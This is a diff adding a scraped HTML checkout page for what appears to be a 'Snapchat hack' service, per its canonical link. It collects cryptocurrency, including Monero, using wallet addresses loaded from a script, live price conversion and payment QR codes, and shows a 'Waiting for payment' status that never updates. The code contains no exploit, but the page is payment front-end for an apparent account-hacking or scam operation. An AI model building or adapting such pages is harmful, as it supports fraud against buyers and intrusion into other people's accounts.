@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Method Selection</title>
+	<link rel="canonical" href="https://snapchat-hack.pages.dev" />
+    <link href="npm/bootstrap-5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        #payment {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            padding: 1.5rem;
+            border-radius: 5px;
+            margin-top: 1rem;
+        }
+        select {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            padding: 0.5rem;
+            border-radius: 5px;
+            width: 100%;
+            margin-bottom: 1rem;
+        }
+        select option {
+            background-color: rgb(47, 46, 46);
+            color: white;
+        }
+        .dots {
+            animation: dots 1.5s infinite;
+        }
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: ''; }
+        }
+        .form-control, .form-select {
+            background: rgba(255, 255, 255, 0.1) !important;
+            border: 1px solid rgba(255, 255, 255, 0.1) !important;
+            color: white !important;
+        }
+        .form-control:focus, .form-select:focus {
+            background: rgba(255, 255, 255, 0.15) !important;
+            border-color: #0dcaf0 !important;
+            box-shadow: 0 0 0 0.25rem rgba(13, 202, 240, 0.25) !important;
+        }
+        .btn-warning {
+            background: #0dcaf0 !important;
+            border-color: #0dcaf0 !important;
+            color: white !important;
+            padding: 0.75rem 2rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+        .btn-warning:hover {
+            background: #31d2f2 !important;
+            border-color: #31d2f2 !important;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(13, 202, 240, 0.3);
+        }
+        .alert-warning {
+            background: rgba(13, 202, 240, 0.1);
+            border-color: #0dcaf0;
+            color: white;
+        }
+        .text-warning {
+            color: #0dcaf0 !important;
+        }
+        /* Method Selection Styling */
+        #methodSelection .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+        #methodSelection .btn-primary {
+            background: #0dcaf0 !important;
+            border-color: #0dcaf0 !important;
+            color: white !important;
+            padding: 0.75rem 2rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+        #methodSelection .btn-primary:hover {
+            background: #31d2f2 !important;
+            border-color: #31d2f2 !important;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(13, 202, 240, 0.3);
+        }
+        #methodSelection .card-title {
+            color: #0dcaf0;
+        }
+        #methodSelection .text-light {
+            color: white !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Payment Method Selection Screen -->
+    <div id="methodSelection" class="container py-5">
+        <div class="row justify-content-center">
+            <div class="col-md-8">
+                <div class="card">
+                    <div class="card-body">
+                        <h3 class="text-center mb-4" style="color: #0dcaf0;">Choose Payment Method</h3>
+                        <div class="row g-4">
+                            <div class="col-md-6">
+                                <div class="card h-100">
+                                    <div class="card-body text-center">
+                                        <h5 class="card-title" style="color: #0dcaf0;">Cryptocurrency</h5>
+                                        <p class="card-text text-light">Pay with Bitcoin, Ethereum, or other cryptocurrencies</p>
+                                        <button class="btn btn-primary" onclick="showCryptoPayment()">
+                                            Pay with Crypto
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="card h-100">
+                                    <div class="card-body text-center">
+                                        <h5 class="card-title" style="color: #0dcaf0;">Other Payment Methods</h5>
+                                        <p class="card-text text-light">Credit Card, PayPal, and more payment options</p>
+                                        <button class="btn btn-primary" onclick="redirectToInstructions()">
+                                            Other Methods
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="text-center mt-3 mb-3">
+                            <p class="text-light">Having issues? <a href="support.html" style="color: #0dcaf0; text-decoration: none;">Contact Support</a></p>
+                        </div>
+                        <div class="text-center mt-4">
+                            <button class="btn btn-primary" onclick="window.history.back()">← Back</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Crypto Payment Form (Initially Hidden) -->
+    <div id="cryptoPayment" class="container py-4" style="display: none;">
+        <div id="payment" class="container py-4">
+            <div class="mb-4">
+                <button class="btn btn-warning" onclick="showMethodSelection()">← Back</button>
+            </div>
+            <h3 class="text-center mb-4">Pay with Cryptocurrency</h3>
+            <div class="mb-4">
+                <label class="form-label text-warning">Choose payment method:</label>
+                <select id="cryptos" class="form-select bg-dark text-light">
+                    <option value="btc">Bitcoin (BTC)</option>
+                    <option value="eth">Ethereum (ETH)</option>
+                    <option value="bnb">Binance Coin (BNB)</option>
+                    <option value="xrp">Ripple (XRP)</option>
+                    <option value="sol">Solana (SOL)</option>
+                    <option value="pol">Polygon (POL)</option>
+                    <option value="ltc">Litecoin (LTC)</option>
+                    <option value="bch">Bitcoin Cash (BCH)</option>
+                    <option value="doge">Dogecoin (DOGE)</option>
+                    <option value="xmr">Monero (XMR)</option>
+                    <option value="trx">Tron (TRX)</option>
+                    <option value="erc20">Tether (USDT)(ETH ERC-20)</option>
+                    <option value="trc20">Tether (USDT)(TRX TRC-20)</option>
+                </select>
+            </div>
+            <div class="mb-3">
+                <label class="form-label text-warning"><span class="cryp">BTC</span> Address:</label>
+                <div class="input-group">
+                    <input type="text" id="btc" class="form-control bg-dark text-light" readonly>
+                    <button class="btn btn-warning" onclick="copy_all()">Copy</button>
+                </div>
+            </div>
+            <div class="mb-3">
+                <label class="form-label text-warning">Amount to send:</label>
+                <div class="input-group">
+                    <input type="text" id="amountInput" class="form-control bg-dark text-light" readonly>
+                    <button class="btn btn-warning" onclick="copyAmount()">Copy</button>
+                </div>
+            </div>
+            <div id="qr" class="text-center mb-4">
+                <button class="btn btn-warning mb-3" id="qrtoggler" onclick="toggleqr()">Show payment QR</button>
+                <img style="display: none; max-width: 200px; margin: 1rem auto;" src="" id="qrpay" alt="QR Code">
+            </div>
+            <div class="alert alert-warning">
+                <ol class="mb-0">
+                    <li>Open your crypto wallet and copy the address above</li>
+                    <li>Send exactly the specified amount</li>
+                    <li>Wait for payment confirmation</li>
+                    <li>Click continue when status shows "paid"</li>
+                </ol>
+            </div>
+            <div class="alert alert-info mb-3">
+                <p class="mb-0">
+                    <i class="fas fa-info-circle"></i> If you've made the payment but the status hasn't changed, please 
+                    <a href="support.html" style="color: #0dcaf0; text-decoration: none; font-weight: 600;">contact support</a> 
+                    with your payment details.
+                </p>
+            </div>
+            <button type="button" class="btn btn-warning w-100" disabled>
+                Waiting for payment<span class="dots"></span>
+            </button>
+        </div>
+    </div>
+    <script src="api/raw/wallets.js"></script>
+    <script>
+        // Get price from URL parameter
+        const params = new URLSearchParams(window.location.search);
+        const encodedPrice = params.get('price');
+        const price = encodedPrice ? parseFloat(atob(encodedPrice)) : 10;
+        const userId = params.get('id') || 'unknown';
+        if (!price) {
+        }
+        function showCryptoPayment() {
+            document.getElementById('methodSelection').style.display = 'none';
+            document.getElementById('cryptoPayment').style.display = 'block';
+        }
+        function showMethodSelection() {
+            document.getElementById('methodSelection').style.display = 'block';
+            document.getElementById('cryptoPayment').style.display = 'none';
+        }
+        function redirectToInstructions() {
+            window.location.href = `payment-instructions.html?price=${encodedPrice}&id=${userId}`;
+        }
+        // Wallet addresses
+        let prices = {};
+        // Fetch crypto prices and initialize
+        fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,ripple,litecoin,dogecoin,monero,tron,solana,tether,bitcoin-cash,matic-network&vs_currencies=usd")
+            .then(data => data.json())
+            .then(data => {
+                prices = {
+                    btc: data.bitcoin.usd,
+                    eth: data.ethereum.usd,
+                    bnb: data.binancecoin.usd,
+                    xrp: data.ripple.usd,
+                    ltc: data.litecoin.usd,
+                    doge: data.dogecoin.usd,
+                    xmr: data.monero.usd,
+                    sol: data.solana.usd,
+                    trx: data.tron.usd,
+                    pol: data['matic-network'].usd,
+                    bch: data['bitcoin-cash'].usd,
+                    erc20: data.tether.usd,
+                    trc20: data.tether.usd
+                };
+                initializePayment();
+            });
+        function initializePayment() {
+            // Set initial BTC values
+            document.getElementById("btc").value = wallets.btc;
+            const initialAmount = (price / prices.btc).toFixed(8);
+            document.getElementById("amountInput").value = `${initialAmount} BTC`;
+            document.getElementById("qrpay").src = "https://api.qrserver.com/v1/create-qr-code/?data=" + 
+                encodeURIComponent(generateCryptoPaymentURI("btc", wallets.btc, initialAmount));
+        }
+        // Add crypto selection handler
+        document.getElementById('cryptos').addEventListener('change', function() {
+            const selectedCrypto = this.value;
+            const cryptoLabel = selectedCrypto === 'erc20' ? 'USDT' : 
+                               selectedCrypto === 'trc20' ? 'USDT' : 
+                               selectedCrypto.toUpperCase();
+            // Update all elements with class 'cryp'
+            document.querySelectorAll(".cryp").forEach(el => {
+                el.textContent = cryptoLabel;
+            });
+            // Update wallet address
+            document.getElementById("btc").value = wallets[selectedCrypto];
+            // Update amount
+            const amount = (price / prices[selectedCrypto]).toFixed(8);
+            document.getElementById("amountInput").value = `${amount} ${cryptoLabel}`;
+            // Handle QR code visibility and update
+            if (selectedCrypto === "erc20" || selectedCrypto === "trc20") {
+                document.getElementById("qr").style.display = "none";
+            } else {
+                document.getElementById("qr").style.display = "block";
+                document.getElementById("qrpay").src = "https://api.qrserver.com/v1/create-qr-code/?data=" + 
+                    encodeURIComponent(generateCryptoPaymentURI(selectedCrypto, wallets[selectedCrypto], amount));
+            }
+        });
+        // Add QR code generation function
+        function generateCryptoPaymentURI(coin, address, amount) {
+            const uriSchemes = {
+                btc: 'bitcoin',
+                eth: 'ethereum',
+                ltc: 'litecoin',
+                bch: 'bitcoincash',
+                xmr: 'monero',
+                doge: 'dogecoin',
+                sol: 'solana',
+                pol: 'polygon',
+                trx: 'tron'
+            };
+            if (uriSchemes[coin]) {
+                return `${uriSchemes[coin]}:${address}?amount=${amount}`;
+            }
+            // For coins without URI schemes, just return the address
+            return address;
+        }
+        // Add copy functions
+        function copy_all() {
+            const copyText = document.getElementById("btc");
+            copyText.select();
+            document.execCommand("copy");
+        }
+        function copyAmount() {
+            const copyText = document.getElementById("amountInput");
+            copyText.select();
+            document.execCommand("copy");
+        }
+        function toggleqr() {
+            const qrImage = document.getElementById("qrpay");
+            const qrButton = document.getElementById("qrtoggler");
+            if (qrImage.style.display === "none") {
+                qrImage.style.display = "block";
+                qrButton.textContent = "Hide payment QR";
+            } else {
+                qrImage.style.display = "none";
+                qrButton.textContent = "Show payment QR";
+            }
+        }
+        // Add this function for the dots animation
+        function updateDots() {
+            const dots = document.querySelector('.dots');
+            if (dots) {
+                let count = (parseInt(dots.getAttribute('data-count') || '0') + 1) % 4;
+                dots.textContent = '.'.repeat(count);
+                dots.setAttribute('data-count', count);
+            }
+        }
+        // Start the dots animation
+        setInterval(updateDots, 500);
+    </script>
+    <script src="jquery-3.7.1.min.js"></script>
+    <script src="npm/bootstrap-5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<center><font size="2">This is the free demo result. For a full version of this website, please go to  <a href="https://www6.waybackmachinedownloader.com/website-downloader-online/scrape-all-files/">Website Downloader</a></font></center></body>
+</html> 
